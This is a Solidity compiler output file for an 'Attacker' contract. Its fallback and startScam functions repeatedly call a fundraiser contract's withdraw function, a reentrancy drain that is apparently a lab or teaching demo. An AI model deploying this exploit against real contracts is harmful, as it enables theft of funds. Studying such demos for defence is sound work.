{
	"": {
		"Attacker": {
			"abi": [
				{
					"constant": false,
					"inputs": [],
					"name": "getFunds",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "nonpayable"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "fundraiserAddress",
					"outputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "view"
				},
				{
					"constant": false,
					"inputs": [
						{
							"name": "fundraiserAddress",
							"type": "address"
						}
					],
					"name": "payMe",
					"outputs": [],
					"payable": true,
					"type": "function",
					"stateMutability": "payable"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "drainTimes",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"type": "function",
					"stateMutability": "view"
				},
				{
					"constant": false,
					"inputs": [
						{
							"name": "fundraiserAddress",
							"type": "address"
						}
					],
					"name": "startScam",
					"outputs": [],
					"payable": true,
					"type": "function",
					"stateMutability": "payable"
				},
				{
					"payable": true,
					"type": "fallback",
					"stateMutability": "payable"
				}
			],
			"evm": {
				"bytecode": {
					"object": "6060604052600060015534610000575b61029f8061001d6000396000f360606040523615610065576000357c0100000000000000000000000000000000000000000000000000000000900480634d9b3735146101155780636568700814610138578063ad218d4314610171578063c4f9a44414610189578063e27bdd80146101ac575b6101135b6003600154101561011057600160008154809291906001019190505550600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b604051817c0100000000000000000000000000000000000000000000000000000000028152600401809050600060405180830381600087803b156100005760325a03f115610000575050505b5b565b005b34610000576101226101c4565b6040518082815260200191505060405180910390f35b34610000576101456101e4565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610187600480803590602001909190505061020a565b005b346100005761019661022e565b6040518082815260200191505060405180910390f35b6101c26004808035906020019091905050610234565b005b60003073ffffffffffffffffffffffffffffffffffffffff163190505b90565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff1663d7bb99ba345050505b50565b60015481565b8073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b604051817c0100000000000000000000000000000000000000000000000000000000028152600401809050600060405180830381600087803b156100005760325a03f115610000575050505b5056",
					"opcodes": "PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x0 PUSH1 0x1 SSTORE CALLVALUE PUSH2 0x0 JUMPI JUMPDEST PUSH2 0x29F DUP1 PUSH2 0x1D PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN PUSH1 0x60 PUSH1 0x40 MSTORE CALLDATASIZE ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV DUP1 PUSH4 0x4D9B3735 EQ PUSH2 0x115 JUMPI DUP1 PUSH4 0x65687008 EQ PUSH2 0x138 JUMPI DUP1 PUSH4 0xAD218D43 EQ PUSH2 0x171 JUMPI DUP1 PUSH4 0xC4F9A444 EQ PUSH2 0x189 JUMPI DUP1 PUSH4 0xE27BDD80 EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH2 0x113 JUMPDEST PUSH1 0x3 PUSH1 0x1 SLOAD LT ISZERO PUSH2 0x110 JUMPI PUSH1 0x1 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP PUSH1 0x0 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO PUSH2 0x0 JUMPI PUSH1 0x32 GAS SUB CALL ISZERO PUSH2 0x0 JUMPI POP POP POP JUMPDEST JUMPDEST JUMP JUMPDEST STOP JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0x122 PUSH2 0x1C4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0x145 PUSH2 0x1E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x187 PUSH1 0x4 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP PUSH2 0x20A JUMP JUMPDEST STOP JUMPDEST CALLVALUE PUSH2 0x0 JUMPI PUSH2 0x196 PUSH2 0x22E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1C2 PUSH1 0x4 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP PUSH2 0x234 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP JUMPDEST SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD7BB99BA CALLVALUE POP POP POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO PUSH2 0x0 JUMPI PUSH1 0x32 GAS SUB CALL ISZERO PUSH2 0x0 JUMPI POP POP POP JUMPDEST POP JUMP ",
					"linkReferences": {}
				},
				"methodIdentifiers": {
					"drainTimes()": "c4f9a444",
					"fundraiserAddress()": "65687008",
					"getFunds()": "4d9b3735",
					"payMe(address)": "ad218d43",
					"startScam(address)": "e27bdd80"
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "134200",
						"executionCost": "5175"
					},
					"internal": {
						"()": "infinite"
					},
					"external": {
						"": "infinite",
						"drainTimes()": "infinite",
						"fundraiserAddress()": "infinite",
						"getFunds()": "infinite",
						"payMe(address)": "infinite",
						"startScam(address)": "infinite"
					}
				}
			}
		}
	}
}